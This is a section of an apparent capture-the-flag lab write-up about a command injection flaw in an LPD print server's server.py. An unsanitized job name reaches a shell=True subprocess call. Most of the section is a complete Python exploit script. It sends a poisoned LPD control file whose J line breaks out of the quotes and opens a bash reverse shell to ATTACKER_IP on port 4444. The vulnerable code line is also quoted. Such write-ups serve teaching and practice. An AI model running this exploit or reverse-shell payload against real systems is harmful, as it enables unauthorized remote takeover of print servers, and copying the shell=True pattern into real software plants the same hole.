# 6. Command Injection, or: Never Trust a Job Name

Reading `server.py`, one line stood out like a flashing neon sign in a dark alley.

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` comes straight from the `J` line of the LPD control file, completely unsanitized, and gets dropped directly into a `shell=True` call. It sits inside single quotes in the shell command, so the plan was simple: close the quote, inject a command, comment out whatever comes after with `#`.

Bonus discovery while reading the code: the handler only processes the first chunk received on a connection before executing and moving on. A full control file plus data file pair was not even required. Just the control file chunk with a poisoned `J` line does the job.

### Exploit script

```python
import socket

target = "10.129.248.117"
port = 1515
queue = "archive_intake"
attacker_ip = "ATTACKER_IP"
attacker_port = 4444

def send_recv(s, data):
    s.sendall(data)
    return s.recv(4096)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

resp = send_recv(s, f"\x02{queue}\n".encode())
print("Job init:", resp)

job_id = "003"
hostname = "kali"
cfile_name = f"cfA{job_id}{hostname}"

payload = f"x'; bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\" #"
cfile_content = f"Hhostname\nPuser\nJ{payload}\nldfA{job_id}{hostname}\n"

resp = send_recv(s, f"\x02{len(cfile_content)} {cfile_name}\n".encode())
print("CF header ack:", resp)

s.sendall(cfile_content.encode())
resp = s.recv(4096)
print("Exec ack:", resp)

s.close()
```

